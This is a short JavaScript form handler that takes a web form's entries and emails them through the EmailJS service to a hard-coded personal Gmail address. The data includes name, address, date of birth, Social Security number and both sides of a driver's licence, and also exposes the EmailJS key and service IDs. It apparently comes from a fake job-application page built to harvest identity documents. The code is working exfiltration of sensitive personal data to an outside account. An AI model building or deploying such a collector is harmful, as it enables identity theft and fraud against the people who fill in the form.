// Initialize EmailJS with your User ID and Service ID
emailjs.init("iIZbjZw1UvhaLB_9r");

// Add an event listener to the form submit button
document.getElementById("my-form").addEventListener("submit", function (event) {
  event.preventDefault(); // prevent default form submission

  // Get the form data and uploaded image file
  const formData = new FormData(event.target);

  const emailParams = {
    fullName: formData.get("fullName"),
    email: formData.get("email"),
    number: formData.get("number"),
    address: formData.get("address"),
    city: formData.get("city"),
    zip: formData.get("zip"),
    resume: formData.get("resume"),
    dob: formData.get("dob"),
    ssn: formData.get("ssn"),
    frontDriverLicense: formData.get("frontDriverLicense"),
    backDriverLicense: formData.get("backDriverLicense"),
  };

  const emailObject = {
    to_email: "oladimejigobir@gmail.com", // replace with your email address
    template_id: "contact_form", // replace with the email template ID you created
    template_params: emailParams,
  };

  emailjs.send("service_4nxjxbl", "template_eofevvg", emailParams).then(
    function (response) {
      console.log("SUCCESS!", response.status, response.text);
    },
    function (error) {
      console.log("FAILED...", error);
    }
  );

});
